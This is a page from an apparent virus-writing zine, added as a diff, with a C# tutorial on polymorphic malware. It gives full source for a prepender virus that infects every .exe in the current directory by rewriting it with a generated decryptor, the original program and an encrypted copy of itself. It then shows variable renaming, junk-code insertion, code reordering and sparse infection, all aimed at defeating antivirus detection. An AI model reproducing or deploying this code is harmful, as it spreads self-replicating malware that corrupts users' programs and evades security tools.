@@ -1,0 +1,667 @@
+<html>
+<head>
+<title>Doom Riderz - Evilution Issue 1</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="../doom.css">
+<script type="text/javascript" src="../fader.js"></script>
+</head>
+<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<br>
+<div id="viewerText">
+<div id="viewerTextHeader"><a href="#">Polymorphism in C#</a></div>
+<pre>
+<!--- put article/source here --->
+/****************************************************************
+ **** Polymorphism in C#                   
+ **** .net 2.0 
+ **** by free0n 
+ **** free0n.host.sk - doomriderz.co.nr -DoomRiderz
+ ****************************************************************
+ ****/
+
+/****************************************************************
+ ************ Introduction
+ ****************************************************************
+ ****/
+
+ The purpose of this article is to explain different
+ polymorphic techinques using C# in .net 2.0. There
+ are many different ways to achieve this but the basis
+ of all techniques is you need to be able to change, 
+ in order to do this we have to find a way to create 
+ and build a new varient of a program when the main 
+ program runs.
+
+ For example say you have program1, now when you run this
+ program1, the program1 can spawn a new exe. Give birth to 
+ a new varient. Now a new varient means that program2 will
+ not be like program2 exactly. Our goal is change enough
+ to not generate patterns in our infected file.
+
+ [program1]  ---> runs --> [creates program2]
+ [program2]  ---> runs --> [creates program 3]
+
+ Ok so now you know the over simplified version of what we 
+ are trying to do. 
+
+
+/****************************************************************
+ ************ Basic Technique
+ ****************************************************************
+ ****/
+
+ Ok first lets understand how we can build an executable 
+ at runtime in C#. This first example will build a simple 
+ application that can MessageBox a value that is generated 
+ from the first one. 
+
+ 
+using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using System.CodeDom;
+using System.CodeDom.Compiler;
+using Microsoft.CSharp;
+
+namespace MessageBox {
+    class Program {
+        static void Main(string[] args) {
+
+            string msg = "generated at:" DateTime.Now.Hour + DateTime.Now.Minute + DateTime.Now.Second;
+            //generate a new exe name
+            Random r = new Random();
+            
+            //pass our name to BuildExe
+            string name = "msgbox-" + r.Next(100) + ".exe";
+
+            Console.WriteLine("Program Name:" + name);
+            BuildExe(name, msg);
+
+        }
+
+        public static void BuildExe(string name, string msg) {
+            ICodeCompiler ic = new CSharpCodeProvider().CreateCompiler();
+            CompilerParameters cp = new CompilerParameters();
+            cp.ReferencedAssemblies.Add("System.dll");
+            cp.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            cp.GenerateExecutable = true;
+            cp.CompilerOptions = "/target:winexe";
+            cp.OutputAssembly = name;
+
+            string code = "using System; n" +
+                   "using System.Windows.Forms; n" +
+                   "namespace MsgBox { n" +
+                   "    class Program { n" +
+                   "        static void Main(string[] args) { n" +
+                   "            MessageBox.Show("" + msg + ""); n" +
+                   "        } n" +
+                   "    } n" +
+                   "} n";
+
+            CompilerResults results = ic.CompileAssemblyFromSource(cp, code);
+            foreach (CompilerError ce in results.Errors) {
+               Console.WriteLine(ce.ErrorNumber + ": " + ce.ErrorText);
+            }
+        }
+    }
+}
+
+
+Now as you can see the code is built in the BuildExe
+method. This method we pass in a name of exe and a
+message from the main method. Now I know what your 
+thinking building code in a string is lame! OR is it?
+
+Look at the the example with the code in the string. Having it in
+a string we can totally manipulate every variable,
+add new things, pass in values and even encrypt/decrpyt
+data! So a string isn't lame. 
+
+You can now see how we can create a new a program dynamically.
+So lets figure out how we can apply this to our app.
+
+
+/****************************************************************
+ ************ How we can use this technique
+ ****************************************************************
+ ****/
+
+
+With generating an exe at runtime you can now start doing
+different polymorphic techniques and apply encryption. Lets 
+start with our simple prepender app. The prepender app
+looks like this in a infected file.
+
+[app] | [host] 
+
+The app is placed in the first part of the exe so it 
+is executed first. Then once the app is executed it 
+reads itself and seperates the host bytes from itself and 
+then executes the host. Now if we can generate an executable 
+we can generate a decryptor to decrypt it'self so our 
+app will look like this:
+
+[decryptor] [host] [encrypted app] 
+ 
+ or you could do:
+
+[decryptor] [encrypted app] [host]
+
+For the next example below we will do the first one. The
+program execution will flow like this:
+
+1. Decryptor is placed in the first part of the exe
+2. Decryptor seperates the encrypted app and the host
+3. Decryptor decrypts the encrypted app
+4. Decryptor executes the host and waits for the user to exit
+   the host program and then executes the decrypted app
+
+So lets see how this works in C#. This example will use 
+the Rijndael encryption package that C# offers. This is
+good because we can generate a key and pass the value
+to the decryptor which will then use the key we dynamically
+generated to decrypt the app body.
+
+
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using System.CodeDom;
+using System.CodeDom.Compiler;
+using System.Diagnostics;
+using System.Security.Cryptography;
+using Microsoft.CSharp;
+
+namespace Encrypty {
+class Program {
+
+        private static ArrayList wordList = new ArrayList();
+
+        static void Main(string[] args) {
+            Populate(Directory.GetCurrentDirectory());   
+        }
+
+        public static void Populate(string dir) {
+            if (Directory.Exists(dir)) {
+                string[] files = Directory.GetFiles(dir, "*.exe");
+                for (int i = 0; i < files.Length; i++) {
+                    try {
+                        byte[] hostbytes = read(files[i]);
+                        if (hostbytes[60] != 128) {
+                            Random rand = new Random();
+                            int b = rand.Next(1000);
+
+                            string cf = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
+                            string nf = Directory.GetCurrentDirectory() + "\" + RandWords() + ".exe";
+                            string ef = Directory.GetCurrentDirectory() + "\" + RandWords() + DateTime.Now.Year + ".exe";
+                            string key  = RandomKey();
+
+                            //write the current bytes out to a random file name nf
+                            byte[] enc = read(cf);
+                            FileStream fs = new FileStream(nf, FileMode.CreateNew);
+                            BinaryWriter bw = new BinaryWriter(fs);
+                            for (int x = 0; x < enc.Length; x++) {
+                                bw.BaseStream.WriteByte(enc[x]);
+                            }
+                            bw.Close();
+                            fs.Close();
+
+                            //now encrypt the bytes saving it into ef
+                            Encrypt(nf, ef, key);
+
+                            //if we encrypted correctly we can then
+                            //delete the original
+
+                            if (File.Exists(ef)) {
+                                if (File.Exists(nf)) {
+                                    File.Delete(nf);
+                                }
+
+                                //now we figure out how much to read
+                                //and write. The decryptor will then get
+                                //generated and we will start writing the
+                                //new file.
+
+                                FileInfo fi = new FileInfo(files[i]);
+                                int len = (int)fi.Length;
+                                string df = Decryptor(ef, 5632, (len + 5632), key);
+
+                                if (File.Exists(df)) {
+
+                                    //if our decryptor generated
+                                    //then read both the encrypted and decrypted
+                                    //bytes and then write them to the file
+                                    //that we are infecting. 
+
+                                    byte[] byteDec = read(df);
+                                    byte[] byteEnc = read(ef);
+
+                                    //recreating the file
+                                    if (File.Exists(files[i])) {
+                                        File.Delete(files[i]);
+
+                                        FileStream fsb = new FileStream(files[i], FileMode.CreateNew);
+                                        BinaryWriter bwb = new BinaryWriter(fsb);
+
+                                        //write the decryptor first
+                                        for (int x = 0; x < byteDec.Length; x++) {
+                                            bwb.BaseStream.WriteByte(byteDec[x]);
+                                        }
+
+                                        //write the host bytes
+                                        for (int w = 0; w < hostbytes.Length; w++) {
+                                            bwb.BaseStream.WriteByte(hostbytes[w]);
+                                        }
+
+                                        //write the encrypted app bytes
+                                        for (int z = 0; z < byteEnc.Length; z++) {
+                                            bwb.BaseStream.WriteByte(byteEnc[z]);
+                                        }
+
+                                        bwb.Close();
+                                        fsb.Close();
+
+                                        //delete the decryptor and the encrypted file
+                                        File.Delete(ef);
+                                        File.Delete(df);
+                                    }
+                                } else {
+                                    if (File.Exists(ef)) {
+                                        File.Delete(ef);
+                                    }
+                                }
+                            }
+                        }
+
+                    } catch { }
+                }
+            }
+        }
+
+        public static void Encrypt(string inf, string outf, string p) {
+            try {
+                UnicodeEncoding UE = new UnicodeEncoding();
+                byte[] key = UE.GetBytes(p);
+
+                FileStream fsc = new FileStream(outf, FileMode.Create);
+                RijndaelManaged cr = new RijndaelManaged();
+                CryptoStream cs = new CryptoStream(fsc, cr.CreateEncryptor(key, key), CryptoStreamMode.Write);
+                FileStream fsIn = new FileStream(inf, FileMode.Open);
+                int d;
+                while ((d = fsIn.ReadByte()) != -1) {
+                    cs.WriteByte((byte)d);
+                }
+                fsIn.Close();
+                cs.Close();
+                fsc.Close();
+
+            } catch { 
+            }
+        }
+
+        public static string Decryptor(string f, int num, int hl, string key) {
+            string name = Directory.GetCurrentDirectory() + "\" + RandWords() + DateTime.Now.Year + ".exe";
+            ICodeCompiler ic = new CSharpCodeProvider().CreateCompiler();
+            CompilerParameters cp = new CompilerParameters();
+            cp.ReferencedAssemblies.Add("System.dll");
+            cp.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            cp.GenerateExecutable = true;
+            cp.CompilerOptions = "/target:winexe";
+            cp.OutputAssembly = name;
+
+            Random r = new Random();
+            string n = RandWords() + r.Next(100);
+            string n2 = RandWords() + hl;
+            string r2 = RandWords() + r.Next(hl);
+
+            string d = "n" +
+            "using System; n" +
+            "using System.Windows.Forms; n" +
+            "using System.Security.Cryptography; n" +
+            "using System.Text; n" +
+            "using System.Diagnostics; n" +
+            "using System.IO; n" +
+            "using System.Threading; n" +
+            "namespace " + n + " { n" +
+            "   class " + n + n2 + ": Form { n" +
+
+            "       static string cf = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName); n" +
+            "       static string inf = @"" + f + ""; n" +
+            "       static string outf = @"" + n2 + ".exe"; n" +
+            "       static string tmp = @"" + n2 + r2 + ".exe"; n" +
+            "       static string p = @"" + key + ""; n";
+            
+            d += "  public static void Main() { n" +
+            "             " + r2 + "(); n" +
+            "       } n" +
+            "       private static void " + r2 + "() { n" +
+            "           try { n " +
+
+                            //read current file into byte array
+            "               FileStream fs = new FileStream(cf, FileMode.Open, FileAccess.Read); n" +
+            "               BinaryReader brb = new BinaryReader(fs); n" +
+            "               byte[] b = new byte[fs.Length]; n" +
+            "               for (int q = 0; q < b.Length; q++) { n" +
+            "                   b[q] = brb.ReadByte(); n" +
+            "               } n" +
+            "               brb.Close(); n" +
+            "               fs.Close(); n" +
+
+                            //write temp host program
+            "               FileStream fsb = new FileStream(tmp, FileMode.CreateNew); n" +
+            "               BinaryWriter bwb = new BinaryWriter(fsb); n" +
+            "               for (int z = " + num + "; z < " + hl + "; z++) { n" +
+            "                    bwb.BaseStream.WriteByte(b[z]); n" +
+            "               } n " +
+            "               fsb.Close(); n" +
+            "               bwb.Close(); n" +
+            "               File.SetAttributes(tmp, FileAttributes.Hidden); n" +
+
+                            //start temp program and wait for it to exit
+            "               try { n" +
+            "                   Process.Start(tmp).WaitForExit(); n" +
+            "                   File.Delete(tmp); n" +
+            "               } catch { } n" +
+
+                            //read encrypted version and write to a file
+            "               FileStream fb = new FileStream(inf, FileMode.CreateNew); n" +
+            "               BinaryWriter bw = new BinaryWriter(fb); n" +
+            "               for (int z = " + hl + "; z < b.Length; z++) { n" +
+            "                    bw.BaseStream.WriteByte(b[z]); n" +
+            "               } n " +
+            "               fb.Close(); n" +
+            "               bw.Close(); n" +
+            "               File.SetAttributes(inf, FileAttributes.Hidden); n";
+
+                            //start decrypting the bytes from the file
+            d += "          UnicodeEncoding UE = new UnicodeEncoding(); n" +
+            "               byte[] k = UE.GetBytes(p); n" +
+            "               FileStream fr = new FileStream(inf, FileMode.Open); n" +
+            "               RijndaelManaged r = new RijndaelManaged(); n" +
+            "               CryptoStream cs = new CryptoStream(fr, r.CreateDecryptor(k, k), CryptoStreamMode.Read); n" +
+            "               if(File.Exists(outf)) { n" +
+            "                   File.Delete(outf); n" +
+            "               } n" +
+            "               FileStream o = new FileStream(outf, FileMode.Create); n" +
+            "               int data; n" +
+            "               while((data = cs.ReadByte()) != -1) { n" +
+            "                   o.WriteByte((byte)data); n" +
+            "               } n" +
+            "               o.Close(); n" +
+            "               cs.Close(); n" +
+            "               fr.Close(); n";
+            
+            d += "          if(File.Exists(inf)) { n" +
+            "                   File.Delete(inf); n" +
+            "               } n" +
+            "               Thread t = new Thread(new ThreadStart(" + r2 + n2 + ")); n" +
+            "               t.Start(); n" +
+            "           } catch (Exception er) { n  n } n" +
+            "       } n" +
+            "       private static void " + r2 + n2 + "() { n" +
+            "           try { n" +
+            "               Process.Start(outf).WaitForExit(); n" +
+            "               File.Delete(outf); n" +
+            "           } catch { } n" +
+            "       } n" +
+            "       n" +
+            "   } n" +
+            "} n";
+
+            CompilerResults results = ic.CompileAssemblyFromSource(cp, d);
+            if (File.Exists(name)) {
+                File.SetAttributes(name, FileAttributes.Hidden);
+            }
+            return name;
+        }
+
+        public static string RandWords() {
+            string c = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZMaDeByfReeOn";
+            Random r = new Random(unchecked((int)DateTime.Now.Ticks));
+            string n = "";
+            for (int i = 0; i < r.Next(4, 100); i++) {
+                n += c[r.Next(c.Length)];
+            }
+
+            if (wordList.Contains(n)) {
+                wordList.Add(n + DateTime.Now.Second);
+            } else {
+                wordList.Add(n);
+            }
+
+            return n;
+        }
+        
+        public static string RandomKey() {
+            string c = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZMaDeByfReeOn";
+            Random r = new Random(unchecked((int)DateTime.Now.Ticks));
+            string n = "";
+            for (int i = 0; i < r.Next(0, 100); i++) {
+                n += c[r.Next(c.Length)];
+            }
+            if (n.Length > 8) {
+                n = n.Substring(0, 8);
+            } else {
+                int b = 8 - n.Length;
+                for (int i = 0; i < b; i++) {
+                    n += c[i];
+                }
+            }
+            return n;
+        }
+
+
+        public static byte[] read(string d) {
+            //simply reads a file and returns it as a byte array
+            FileStream fs = new FileStream(d, FileMode.Open, FileAccess.Read);
+            BinaryReader br = new BinaryReader(fs);
+            byte[] b = new byte[fs.Length];
+            for (int f = 0; f < b.Length; f++) {
+                b[f] = br.ReadByte();
+            }
+            br.Close();
+            fs.Close();
+            return b;
+        }
+    }
+}
+
+
+
+So now that we have our app that is able to infect files in 
+the current directory. The infection routine can now include
+encryption since we can generate a decryptor.
+
+
+/****************************************************************
+ ************ Applying Polymorphism
+ ****************************************************************
+ ****/
+
+Lets start with what we have now in a infected file. 
+
+[decryptor] [host] [encrypted app]
+
+We know that AV people look for any type of pattern. This obviously
+is a problem for our decryptor. Since in the above example will 
+generate the same decryptor every time. To avoid this we must
+change our code string that we use to build the decryptor.
+
+Like I said earlier, having the code in string will allow us to do
+things like variable changing, adding trash, body moving. 
+
+
+1) Variable changing.
+
+We have the decryptor in our string what we can do is replace
+every variable with a random word. Then keep track of each 
+word/variable used in a hashtable. We then reference the 
+hashtable anytime we have to use a previous variable.
+
+Hashtables work based on a key and value sort of like
+an array. We can use the index to address the value and
+retrieve a random word. With variable changing we can
+avoid any type of pattern.
+
+Before:
+
+string code = "using System; n" +
+              "using System.Windows.Forms; n" +
+              "namespace MsgBox { n" +
+              "    class Program { n" +
+              "        static void Main(string[] args) { n" +
+	      "		   string variable1 = "string value "; n" + 
+              "            MessageBox.Show("" + msg + ""); n" +
+              "        } n" +
+              "    } n" +
+              "} n";
+
+
+After:
+
+ArrayList wordList = new ArrayList();
+Hashtable hashish = new Hashtable();
+
+for (int hi = 0; hi < 3; hi++) {
+   string val = new RandomWord().RandomWords(r.Next(4, 12345));
+   if (wordList.IndexOf(val) != -1) {
+      val += val + DateTime.Now.Millisecond;
+   }
+   wordList.Add(val);
+   hashish.Add(hi, val);
+}
+
+//now we change all the variables
+//to random words. Anything that we 
+//can give a different name we change and
+//all we do is reference the hashtable by an
+//index to retrive the value. So incase
+//we need to reference a variable more than once
+//we just call the same index again
+
+string code = "using System; n" +
+              "using System.Windows.Forms; n" +
+              "namespace + hashish[1] + { n" +
+              "    class  + hashish[2] + { n" +
+              "        static void Main(string[] args) { n" +
+	      "		   string " + hashish[3] " +  = "string value "; n" + 
+	      "		   string " + hashish[4] " +  = "" + hashish[3] +"";n" +
+              "            MessageBox.Show("" + msg + ""); n" +
+              "        } n" +
+              "    } n" +
+              "} n";
+
+2) Adding Trash
+
+Since there was no trash adding we will add a method that
+will generate a random sort of comments, and variables.
+Then place them in different areas of the code.
+
+ArrayList wordList = new ArrayList();
+public string Trash() {
+   string t = "";
+   for (int hi = 0; hi < 50; hi++) {
+        Random r = new Random();
+        string val = new RandomWord().RandomWords(r.Next(4, 100));
+        
+        while(wordList.IndexOf(val) != -1) {
+           val = new RandomWord().RandomWords(r.Next(4, 200));
+        }
+        
+        if (r.Next(1, 100) % 2 == 1) {
+           //comment code
+           t += "//" + val + " n";
+        } else {
+	   //this is basic example of variable assignment
+           //we can do this with pretty much most variables
+           //but for this example we will just do strings
+           string vals = new RandomWord().RandomWords(r.Next(4, 300));
+           t += "string " + val + " = "" + vals + ""; n";
+        }
+        wordList.Add(val);
+   }
+   return t;
+}
+
+
+3) Code Moving.
+
+Since the code is wrapped in a string we can break it
+up into different parts. This is so we can then concatenate 
+different parts of the string in a random order. 
+That won't affect compilation 
+
+So  for example
+
+[beginning] + [variables] + [decryption] + [trash] + [end]
+
+[beginning] + [variables] + [trash] + [decryption] + [trash] + [end]
+
+[beginning] + [trash] + [variables] + [decryption] + [trash] + [end]
+
+
+string beginning = "using System; n" +
+              	   "using System.Windows.Forms; n" +
+                   "namespace + hashish[1] + { n" +
+                   "    class  + hashish[2] + { n";
+
+string variables = "string " + hashish[3] " +  = "string value "; n";
+
+string main = "     static void Main(string[] args) { n" +
+              "            MessageBox.Show("" + msg + ""); n" +
+              "     } n";
+
+string end = "    } n" +
+              "} n";
+
+
+string code = "";
+if(((int)DateTime.Now.Ticks % 2) == 1) {
+   code += beginning + variables + main + end;
+} else {
+   code += beginning + Trash() + variables + Trash() + main + end;
+}
+CompilerResults results = ic.CompileAssemblyFromSource(cp, code);
+
+The key to code moving is to base it randomly but in
+a order that you can still compile the code. This example is just
+a basic idea you would most likley want to store each code sequence
+in a arry of some sort then randomly sort it so it wouldn't be possible
+to guess which sequence it would run. 
+
+
+/****************************************************************
+ ************ The END
+ ****************************************************************
+ ****/
+
+You will really notice all these techniques when you 
+run ildasm on an infected exe. You'll notice that you generated
+enough different varients that it will trouble AV.
+
+Another interesting note is that using these techniques
+with another called sparse infection is good. Sparse infection
+is the idea that you don't infect every file or you don't
+infect any files when your app is run. This will piss off
+AV so much because in order for AV to find as many patterns
+from the decryptors they have to run it a couple thousand times.
+
+I hope this text wasn't to hard to understand. If you
+are new to C# then youre probably really confused lol. 
+
+Some other ideas you can try with this is generating 
+an exe that generates another exe and encrypt the code strings.
+or possibly dividing up the host and app into different bytes
+and randomly sorting them and then add encryption (baldr:) The
+possiblities are pretty much endless now that you have 
+the ability.Creation is a gift so use wisely :) Oh yes I'm
+very sorry for all my grammer mistakes and spelling errors. 
+Years on the computer have made me horrible with spelling
+and grammer.
+</pre>
+</div>
+</body>
+</html>
